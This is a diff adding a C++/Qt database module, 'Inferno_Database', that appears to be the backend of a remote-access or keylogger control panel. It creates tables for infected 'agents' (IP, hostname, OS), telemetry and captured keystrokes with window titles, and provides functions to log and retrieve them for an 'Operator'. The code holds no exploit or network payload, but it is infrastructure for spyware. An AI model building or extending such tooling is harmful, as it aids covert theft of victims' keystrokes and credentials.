@@ -1,0 +1,188 @@
+#include "../include/Inferno_Database.hpp"
+#include <QTimeZone>
+
+namespace inferno {
+
+Inferno_Database& Inferno_Database::instance() {
+    static Inferno_Database inst;
+    return inst;
+}
+
+Inferno_Database::Inferno_Database(QObject* parent) : QObject(parent) {}
+
+Inferno_Database::~Inferno_Database() {
+    close();
+}
+
+bool Inferno_Database::initialize(const QString& host, int port, const QString& dbName, const QString& user, const QString& password) {
+    m_db = QSqlDatabase::addDatabase("QPSQL");
+    m_db.setHostName(host);
+    m_db.setPort(port);
+    m_db.setDatabaseName(dbName);
+    m_db.setUserName(user);
+    m_db.setPassword(password);
+
+    if (!m_db.open()) {
+        qDebug() << "[Database] CRITICAL: Failed to connect to PostgreSQL:" << m_db.lastError().text();
+        return false;
+    }
+
+    qDebug() << "[Database] Successfully connected to PostgreSQL.";
+    return createTables();
+}
+
+void Inferno_Database::close() {
+    if (m_db.isOpen()) {
+        m_db.close();
+    }
+}
+
+bool Inferno_Database::createTables() {
+    QSqlQuery query;
+    
+    // 1. Agents Table
+    if (!query.exec("CREATE TABLE IF NOT EXISTS agents ("
+                    "id SERIAL PRIMARY KEY, "
+                    "uuid VARCHAR(64) UNIQUE NOT NULL, "
+                    "ip_address VARCHAR(45) NOT NULL, "
+                    "hostname TEXT, "
+                    "os_info TEXT, "
+                    "first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, "
+                    "last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, "
+                    "is_online BOOLEAN DEFAULT TRUE)")) {
+        qDebug() << "[Database] Error creating agents table:" << query.lastError().text();
+        return false;
+    }
+
+    // 2. Telemetry Table
+    if (!query.exec("CREATE TABLE IF NOT EXISTS telemetry ("
+                    "id SERIAL PRIMARY KEY, "
+                    "agent_uuid VARCHAR(64) REFERENCES agents(uuid), "
+                    "type VARCHAR(20), "
+                    "content TEXT NOT NULL, "
+                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
+        qDebug() << "[Database] Error creating telemetry table:" << query.lastError().text();
+        return false;
+    }
+
+    // 3. Keylogs Table
+    if (!query.exec("CREATE TABLE IF NOT EXISTS keylogs ("
+                    "id SERIAL PRIMARY KEY, "
+                    "agent_uuid VARCHAR(64) REFERENCES agents(uuid), "
+                    "window_title TEXT, "
+                    "content TEXT NOT NULL, "
+                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
+        qDebug() << "[Database] Error creating keylogs table:" << query.lastError().text();
+        return false;
+    }
+
+    return true;
+}
+
+int Inferno_Database::registerAgent(const QString& uuid, const QString& ip, const QString& hostname, const QString& osInfo) {
+    QSqlQuery query;
+    query.prepare("INSERT INTO agents (uuid, ip_address, hostname, os_info, last_seen, is_online) "
+                  "VALUES (:uuid, :ip, :host, :os, CURRENT_TIMESTAMP, TRUE) "
+                  "ON CONFLICT (uuid) DO UPDATE SET "
+                  "ip_address = EXCLUDED.ip_address, "
+                  "last_seen = EXCLUDED.last_seen, "
+                  "is_online = TRUE "
+                  "RETURNING id");
+    
+    query.bindValue(":uuid", uuid);
+    query.bindValue(":ip", ip);
+    query.bindValue(":host", hostname);
+    query.bindValue(":os", osInfo);
+
+    if (query.exec() && query.next()) {
+        return query.value(0).toInt();
+    }
+    
+    qDebug() << "[Database] Error registering agent:" << query.lastError().text();
+    return -1;
+}
+
+void Inferno_Database::logTelemetry(const QString& uuid, const QString& type, const QString& content) {
+    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") {
+        qDebug() << "[Database] WARNING: Attempted to log telemetry for UNKNOWN agent. Dropping data.";
+        return;
+    }
+    QSqlQuery query;
+    query.prepare("INSERT INTO telemetry (agent_uuid, type, content) VALUES (:uuid, :type, :content)");
+    query.bindValue(":uuid", uuid);
+    query.bindValue(":type", type);
+    query.bindValue(":content", content);
+
+    if (!query.exec()) {
+        qDebug() << "[Database] Error logging telemetry:" << query.lastError().text();
+    }
+}
+
+void Inferno_Database::logKeylog(const QString& uuid, const QString& windowTitle, const QString& content) {
+    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") {
+        qDebug() << "[Database] WARNING: Attempted to log keylog for UNKNOWN agent. Dropping data.";
+        return;
+    }
+    QSqlQuery query;
+    query.prepare("INSERT INTO keylogs (agent_uuid, window_title, content) VALUES (:uuid, :title, :content)");
+    query.bindValue(":uuid", uuid);
+    query.bindValue(":title", windowTitle);
+    query.bindValue(":content", content);
+
+    if (!query.exec()) {
+        qDebug() << "[Database] Error logging keylog:" << query.lastError().text();
+    }
+}
+
+QStringList Inferno_Database::getTelemetryHistory(const QString& uuid, const QString& type, int limit) {
+    QStringList history;
+    QSqlQuery query;
+    
+    QString sql = "SELECT timestamp, content FROM telemetry WHERE agent_uuid = :uuid ";
+    if (!type.isEmpty() && type != "ALL") {
+        sql += "AND type = :type ";
+    }
+    sql += "ORDER BY timestamp DESC LIMIT :limit";
+
+    query.prepare(sql);
+    query.bindValue(":uuid", uuid);
+    if (!type.isEmpty() && type != "ALL") {
+        query.bindValue(":type", type);
+    }
+    query.bindValue(":limit", limit);
+
+    // Diagnostic Log for the Operator
+    qDebug() << "[Database] Fetching history for UUID:" << uuid << "Type:" << type;
+
+    if (query.exec()) {
+        while (query.next()) {
+            QDateTime dt = query.value(0).toDateTime();
+            dt.setTimeZone(QTimeZone::utc()); 
+            QString ts = dt.toLocalTime().toString("HH:mm:ss");
+            history.append(QString("[%1] %2").arg(ts, query.value(1).toString()));
+        }
+    } else {
+        qDebug() << "[Database] History Fetch Error:" << query.lastError().text();
+    }
+    return history;
+}
+
+QStringList Inferno_Database::getKeylogHistory(const QString& uuid, int limit) {
+    QStringList history;
+    QSqlQuery query;
+    query.prepare("SELECT timestamp, content FROM keylogs WHERE agent_uuid = :uuid ORDER BY timestamp DESC LIMIT :limit");
+    query.bindValue(":uuid", uuid);
+    query.bindValue(":limit", limit);
+
+    if (query.exec()) {
+        while (query.next()) {
+            QDateTime dt = query.value(0).toDateTime();
+            dt.setTimeZone(QTimeZone::utc());
+            QString ts = dt.toLocalTime().toString("HH:mm:ss");
+            history.append(QString("[%1] %2").arg(ts, query.value(1).toString()));
+        }
+    }
+    return history;
+}
+
+} // namespace inferno
